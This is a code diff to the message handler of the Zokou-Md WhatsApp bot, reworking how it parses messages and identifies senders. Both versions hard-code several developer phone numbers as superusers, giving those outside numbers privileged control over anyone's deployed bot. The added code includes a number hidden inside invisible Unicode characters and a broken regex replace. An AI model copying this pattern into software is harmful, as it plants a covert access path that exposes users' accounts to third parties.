@@ -113,75 +113,72 @@
             setInterval(() => { store.writeToFile(__dirname + "/store.json");  }, 3000);
            
             zk.ev.on("messages.upsert", async (m) => {
-    const { messages } = m;
-    const ms = messages[0];
-    if (!ms.message) return;
-
-    const decodeJid = (jid) => {
-        if (!jid) return jid;
-        const decoded = jidDecode(jid);
-        if (decoded?.user && decoded?.server) {
-            return `${decoded.user}@${decoded.server}`;
-        }
-        return jid;
-    };
-
-    const mtype = getContentType(ms.message);
-    const texte =
-        mtype === "conversation" ? ms.message.conversation :
-        mtype === "imageMessage" ? ms.message.imageMessage?.caption :
-        mtype === "videoMessage" ? ms.message.videoMessage?.caption :
-        mtype === "extendedTextMessage" ? ms.message?.extendedTextMessage?.text :
-        mtype === "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId :
-        mtype === "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
-        mtype === "messageContextInfo" ? (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) :
-        "";
-
-    const origineMessage = decodeJid(ms.key.remoteJid);
-    const idBot = decodeJid(zk?.user?.id);
-    const servBot = idBot.split("@")[0];
-
-    const verifGroupe = origineMessage.endsWith("@g.us");
-    const infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : null;
-    const nomGroupe = verifGroupe ? infosGroupe.subject : "";
-
-    const msgRepondu = ms.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-    const auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
-    const mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
-    const utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
-
-    let auteurMessage = verifGroupe ? decodeJid(ms.key.participant || ms.participant) : decodeJid(ms.key.remoteJid);
-    if (ms.key.fromMe) auteurMessage = idBot;
-
-    const membreGroupe = verifGroupe ? ms.key.participant : '';
-
-    const { getAllSudoNumbers } = require("./bdd/sudo");
-    const nomAuteurMessage = ms.pushName || "Inconnu";
-
-    const sudo = await getAllSudoNumbers();
-    const superUserNumbers = [servBot, '22559763447', '22543343357', '22564297888', '22891733300', conf.NUMERO_OWNER]
-        .map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
-    const allAllowedNumbers = superUserNumbers.concat(sudo);
-    const superUser = allAllowedNumbers.includes(auteurMessage);
-
-    const dev = ['22559763447', '22543343357', '22564297888', '22891733300']
-        .map((t) => t.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
-        .includes(auteurMessage);
-
-    function repondre(mes) {
-        zk.sendMessage(origineMessage, { text: mes }, { quoted: ms });
-    }
-
-    console.log("\t [][]...{Zokou-Md}...[][]");
-    console.log("=========== Nouveau message ===========");
-    if (verifGroupe) {
-        console.log("message provenant du groupe : " + nomGroupe);
-    }
-    console.log("message envoyé par : [" + nomAuteurMessage + " : " + auteurMessage.split("@")[0] + "]");
-    console.log("type de message : " + mtype);
-    console.log("------ contenu du message ------");
-    console.log(texte);
-});
+                const { messages } = m;
+                const ms = messages[0];
+              //  console.log(ms) ;
+                if (!ms.message)
+                    return;
+                const decodeJid = (jid) => {
+                    if (!jid)
+                        return jid;
+                    if (/:\d+@/gi.test(jid)) {
+                        let decode = (0, baileys_1.jidDecode)(jid) || {};
+                        return decode.user && decode.server && decode.user + '@' + decode.server || jid;
+                    }
+                    else
+                        return jid;
+                };
+                var mtype = (0, baileys_1.getContentType)(ms.message);
+                const texte = mtype == "conversation" ? ms.message.conversation : mtype == "imageMessage" ? ms.message.imageMessage?.caption : mtype == "videoMessage" ? ms.message.videoMessage?.caption : mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : mtype == "buttonsResponseMessage" ?
+                    ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ?
+                    ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ?
+                    (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
+                var origineMessage = ms.key.remoteJid;
+                var idBot = decodeJid(zk.user.id);
+                var servBot = idBot.split('@')[0];
+                /* const dj='22559763447';
+                 const dj2='2250143343357';
+                 const luffy='22891733300'*/
+                /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+                  var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
+                const verifGroupe = origineMessage?.endsWith("@g.us");
+                var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
+                var nomGroupe = verifGroupe ? infosGroupe.subject : "";
+                var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
+                var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
+                //ms.message.extendedTextMessage?.contextInfo?.mentionedJid
+                // ms.message.extendedTextMessage?.contextInfo?.quotedMessage.
+                var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
+                var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
+                var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
+                if (ms.key.fromMe) {
+                    auteurMessage = idBot;
+                }
+                
+                var membreGroupe = verifGroupe ? ms.key.participant : '';
+                const { getAllSudoNumbers } = require("./bdd/sudo");
+                const nomAuteurMessage = ms.pushName;
+                const dj = '22559763447';
+                const dj2 = '22543343357';
+                const dj3 = "22564297888";
+                const luffy = '22891733300';
+                const dj4 = '‪99393228‬';
+                const sudo = await getAllSudoNumbers();
+                const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+                const allAllowedNumbers = superUserNumbers.concat(sudo);
+                const superUser = allAllowedNumbers.includes(auteurMessage);
+                
+                var dev = [dj, dj2,dj3,dj4,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+                function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
+                console.log("\t [][]...{Zokou-Md}...[][]");
+                console.log("=========== Nouveau message ===========");
+                if (verifGroupe) {
+                    console.log("message provenant du groupe : " + nomGroupe);
+                }
+                console.log("message envoyé par : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
+                console.log("type de message : " + mtype);
+                console.log("------ contenu du message ------");
+                console.log(texte);
                 /**  */
                 function groupeAdmin(membreGroupe) {
                     let admin = [];
@@ -692,6 +689,8 @@
                     }} ;
                 //fin exécution commandes
                   
+                 
+                });
             //fin événement message
     
     /******** evenement groupe update ****************/
